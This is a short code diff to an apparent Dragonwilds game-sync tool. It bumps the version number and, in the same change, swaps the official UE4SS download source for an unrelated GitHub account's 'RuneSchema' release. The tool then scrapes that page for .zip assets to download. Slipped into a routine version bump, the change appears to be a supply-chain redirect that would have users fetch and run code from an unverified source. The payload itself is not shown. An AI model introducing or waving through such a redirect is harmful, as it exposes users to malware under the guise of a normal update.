@@ -9,9 +9,9 @@ from pathlib import Path
 
 CLIENT_STEAM_APP_ID = "1374490"
 SERVER_STEAM_APP_ID = "4019830"
-DRAGONWILDS_SYNC_VERSION = "4.0.3"
+DRAGONWILDS_SYNC_VERSION = "4.0.4"
 STEAMCMD_INFO_URL = "https://api.steamcmd.net/v1/info/{appid}"
-UE4SS_RELEASE_TAG_URL = "https://github.com/UE4SS-RE/RE-UE4SS/releases/tag/experimental-latest"
+UE4SS_RELEASE_TAG_URL = "https://github.com/gh0sted5456-us/RuneSchema/releases/tag/0.6.1E"
 _GITHUB_ASSET_HREF_RE = re.compile(r'href="(/[^"]+/releases/download/[^"]+\.zip)"')
 _BUILD_RE = re.compile(r'"buildid"\s+"([^"]+)"', re.IGNORECASE)
 _LAST_UPDATED_RE = re.compile(r'"LastUpdated"\s+"([^"]+)"', re.IGNORECASE)
@@ -64,7 +64,7 @@ def latest_ue4ss_release(timeout: float = 6.0, cache_seconds: float = 900.0) -> 
     cached = _REMOTE_CACHE.get(key)
     if cached and time.time() - cached[0] < cache_seconds:
         return dict(cached[1])
-    url = "https://github.com/UE4SS-RE/RE-UE4SS/releases/expanded_assets/experimental-latest"
+    url = "https://github.com/gh0sted5456-us/RuneSchema/releases/expanded_assets/0.6.1E"
     try:
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (DragonwildsSync/2)"})
         with urllib.request.urlopen(req, timeout=timeout) as response:
